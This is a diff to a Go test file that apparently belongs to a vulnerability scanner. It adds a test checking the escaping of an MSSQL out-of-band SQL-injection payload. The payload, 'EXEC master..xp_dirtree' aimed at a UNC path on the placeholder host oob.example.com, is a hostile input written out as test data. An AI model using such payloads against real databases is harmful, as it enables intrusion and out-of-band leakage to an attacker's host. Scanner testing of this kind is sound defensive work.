@@ -2,6 +2,7 @@ package sqli
 
 import (
 	"context"
+	"fmt"
 	"net/http"
 	"net/http/httptest"
 	"strings"
@@ -189,6 +190,27 @@ func TestSQLi_OOBIntegration(t *testing.T) {
 	}
 	// No findings expected since server doesn't actually execute SQL
 	_ = findings
+}
+
+func TestSQLi_OOBPayloadFormat(t *testing.T) {
+	// Verify the MSSQL xp_dirtree OOB payload produces a valid UNC path,
+	// not a BEL character (\a = 0x07).
+	domain := "oob.example.com"
+
+	// Reproduce the format string from the scanner
+	mssqlPayload := fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\\\\\%s\\\\a'-- -", domain)
+
+	// The Go string should contain \\\\domain\\a (SQL-escaped UNC path).
+	// When the SQL server interprets the string literal, \\\\ → \\, \\ → \,
+	// producing the UNC path \\domain\a.
+	wantSQLEscaped := `\\\\` + domain + `\\a`
+	if !strings.Contains(mssqlPayload, wantSQLEscaped) {
+		t.Errorf("MSSQL OOB payload should contain SQL-escaped UNC path %q, got: %q", wantSQLEscaped, mssqlPayload)
+	}
+	// Must NOT contain a BEL character (0x07)
+	if strings.ContainsRune(mssqlPayload, 0x07) {
+		t.Error("MSSQL OOB payload contains BEL character (0x07), expected literal backslash-a")
+	}
 }
 
 func TestDetectScheme(t *testing.T) {
